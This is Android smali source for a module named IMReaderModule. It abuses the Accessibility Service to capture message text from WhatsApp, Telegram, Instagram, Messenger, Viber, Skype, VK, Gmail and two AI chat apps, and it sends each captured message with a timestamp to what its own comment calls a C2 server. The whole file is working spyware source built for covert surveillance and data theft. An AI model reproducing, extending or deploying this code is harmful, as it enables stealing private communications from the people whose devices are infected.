.class public Lcom/smilex/enhanced/modules/IMReaderModule;
.super Ljava/lang/Object;
.source "IMReaderModule.java"

# Per-app IM message extraction via Accessibility Service.
# Ported from hwapp391 hw/imreader/ package (v.java=WhatsApp, s.java=Telegram,
# m.java=Instagram, f.java=Facebook Messenger, t.java=Viber, q.java=Skype,
# u.java=VK, g.java=Gmail, e.java=DeepSeek, i.java=Grok).
#
# Supported apps:
#   com.whatsapp               - WhatsApp
#   org.telegram.messenger     - Telegram
#   com.instagram.android      - Instagram DMs
#   com.facebook.orca          - Facebook Messenger
#   com.viber.voip             - Viber
#   com.skype.raider           - Skype
#   com.vkontakte.android      - VKontakte
#   com.google.android.gm      - Gmail
#   com.deepseek.chat          - DeepSeek AI
#   com.x.ai.grok              - Grok AI

.field private static final WHATSAPP:Ljava/lang/String; = "com.whatsapp"
.field private static final TELEGRAM:Ljava/lang/String; = "org.telegram.messenger"
.field private static final INSTAGRAM:Ljava/lang/String; = "com.instagram.android"
.field private static final FACEBOOK:Ljava/lang/String; = "com.facebook.orca"
.field private static final VIBER:Ljava/lang/String; = "com.viber.voip"
.field private static final SKYPE:Ljava/lang/String; = "com.skype.raider"
.field private static final VK:Ljava/lang/String; = "com.vkontakte.android"
.field private static final GMAIL:Ljava/lang/String; = "com.google.android.gm"
.field private static final DEEPSEEK:Ljava/lang/String; = "com.deepseek.chat"
.field private static final GROK:Ljava/lang/String; = "com.x.ai.grok"

.method public constructor <init>()V
    .registers 1
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method

# Check if a package is a monitored IM app
.method public static isIMApp(Ljava/lang/String;)Z
    .registers 3
    if-eqz p0, :return_false

    const-string v0, "com.whatsapp"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "org.telegram.messenger"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.instagram.android"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.facebook.orca"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.viber.voip"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.skype.raider"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.vkontakte.android"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.google.android.gm"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.deepseek.chat"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    const-string v0, "com.x.ai.grok"
    invoke-virtual {p0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :return_true

    :return_false
    const/4 v0, 0x0
    return v0

    :return_true
    const/4 v0, 0x1
    return v0
.end method

# Process an accessibility event for IM apps — extract text and send to C2
# p0 = packageName (String), p1 = eventText (String), p2 = eventType (int)
.method public static processIMEvent(Ljava/lang/String;Ljava/lang/String;I)V
    .registers 10
    if-eqz p0, :return_void
    if-eqz p1, :return_void

    invoke-virtual {p1}, Ljava/lang/String;->trim()Ljava/lang/String;
    move-result-object p1
    invoke-virtual {p1}, Ljava/lang/String;->isEmpty()Z
    move-result v0
    if-nez v0, :return_void

    :try_start
    # Build JSON: {"app": pkg, "text": text, "ts": timestamp}
    new-instance v0, Lorg/json/JSONObject;
    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    const-string v1, "app"
    invoke-virtual {v0, v1, p0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v1, "text"
    invoke-virtual {v0, v1, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J
    move-result-wide v2
    const-string v4, "ts"
    invoke-virtual {v0, v4, v2, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    # Determine data_type label based on package
    const-string v1, "com.whatsapp"
    invoke-virtual {p0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-eqz v1, :check_telegram
    const-string v1, "im_whatsapp"
    goto :send

    :check_telegram
    const-string v1, "org.telegram.messenger"
    invoke-virtual {p0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-eqz v1, :check_instagram
    const-string v1, "im_telegram"
    goto :send

    :check_instagram
    const-string v1, "com.instagram.android"
    invoke-virtual {p0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-eqz v1, :check_facebook
    const-string v1, "im_instagram"
    goto :send

    :check_facebook
    const-string v1, "com.facebook.orca"
    invoke-virtual {p0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-eqz v1, :check_viber
    const-string v1, "im_facebook"
    goto :send

    :check_viber
    const-string v1, "com.viber.voip"
    invoke-virtual {p0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-eqz v1, :check_skype
    const-string v1, "im_viber"
    goto :send

    :check_skype
    const-string v1, "com.skype.raider"
    invoke-virtual {p0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-eqz v1, :check_vk
    const-string v1, "im_skype"
    goto :send

    :check_vk
    const-string v1, "com.vkontakte.android"
    invoke-virtual {p0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-eqz v1, :check_gmail
    const-string v1, "im_vk"
    goto :send

    :check_gmail
    const-string v1, "com.google.android.gm"
    invoke-virtual {p0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-eqz v1, :check_deepseek
    const-string v1, "im_gmail"
    goto :send

    :check_deepseek
    const-string v1, "com.deepseek.chat"
    invoke-virtual {p0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-eqz v1, :default_im
    const-string v1, "im_deepseek"
    goto :send

    :default_im
    const-string v1, "im"

    :send
    invoke-virtual {v0}, Lorg/json/JSONObject;->toString()Ljava/lang/String;
    move-result-object v2
    invoke-static {v1, v2}, Lcom/smilex/enhanced/modules/NetworkModule;->sendData(Ljava/lang/String;Ljava/lang/String;)V

    :return_void
    return-void
    :try_end
    .catch Ljava/lang/Exception; {:try_start .. :try_end} :error
    :error
    return-void
.end method
